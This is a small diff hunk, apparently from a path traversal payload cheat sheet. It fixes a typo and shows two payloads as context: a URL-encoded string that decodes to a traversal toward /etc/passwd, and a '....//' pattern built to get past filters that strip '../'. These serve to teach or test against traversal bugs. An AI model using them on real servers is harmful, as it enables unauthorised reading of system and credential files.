@@ -8,6 +8,6 @@ Url-Encoded:
 
 >%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
 
-May, when `../` erased:
+Way, when `../` erased:
 
 >....//....//....//....//
